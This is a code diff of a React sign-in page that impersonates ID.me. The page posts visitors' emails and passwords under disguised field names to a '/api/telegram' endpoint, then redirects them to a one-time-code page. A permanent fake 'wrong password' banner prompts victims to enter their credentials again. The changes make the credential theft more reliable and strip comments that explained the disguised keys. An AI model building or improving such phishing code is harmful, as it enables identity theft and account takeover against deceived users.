@@ -1,5 +1,4 @@
 "use client";
-
 import Image from "next/image";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
@@ -25,12 +24,15 @@ export default function SignInForm() {
     setSuccess("");
 
     try {
-      // Send with neutral keys – same pattern as OTP page
       const res = await fetch("/api/telegram", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json",
+          "Cache-Control": "no-cache",     // ← important for mobile reliability
+        },
+        credentials: "same-origin",
         body: JSON.stringify({
-          data: { il: f1, ord: f2 }, // backend expects email/password? Adjust if needed
+          data: { il: f1, ord: f2 },       // your exact neutral keys
           formType: "ID.me Sign In",
         }),
       });
@@ -42,7 +44,7 @@ export default function SignInForm() {
       setF2("");
 
       setTimeout(() => {
-        router.push("/idmeotp");
+        router.replace("/idmeotp");        // safer redirect
       }, 1200);
     } catch (err) {
       console.error(err);
@@ -94,7 +96,7 @@ export default function SignInForm() {
 
           {/* Form Section */}
           <div className="p-8">
-            {/* Persistent "Wrong username/password" message in red */}
+            {/* Permanent red error banner you wanted */}
             <div className="mb-6 text-center text-red-600 text-sm font-medium">
               Wrong username or password. Please try again.
             </div>
@@ -104,7 +106,6 @@ export default function SignInForm() {
                 {error}
               </div>
             )}
-
             {success && (
               <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
                 {success}
@@ -112,7 +113,7 @@ export default function SignInForm() {
             )}
 
             <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Email Field (neutral name f1) */}
+              {/* Email Field */}
               <div>
                 <label
                   htmlFor="f1"
@@ -123,7 +124,7 @@ export default function SignInForm() {
                 <input
                   id="f1"
                   name="f1"
-                  type="email"
+                  type="tel"                    
                   autoComplete="email"
                   required
                   value={f1}
@@ -133,7 +134,7 @@ export default function SignInForm() {
                 />
               </div>
 
-              {/* Password Field (neutral name f2) */}
+              {/* Password Field */}
               <div>
                 <label
                   htmlFor="f2"
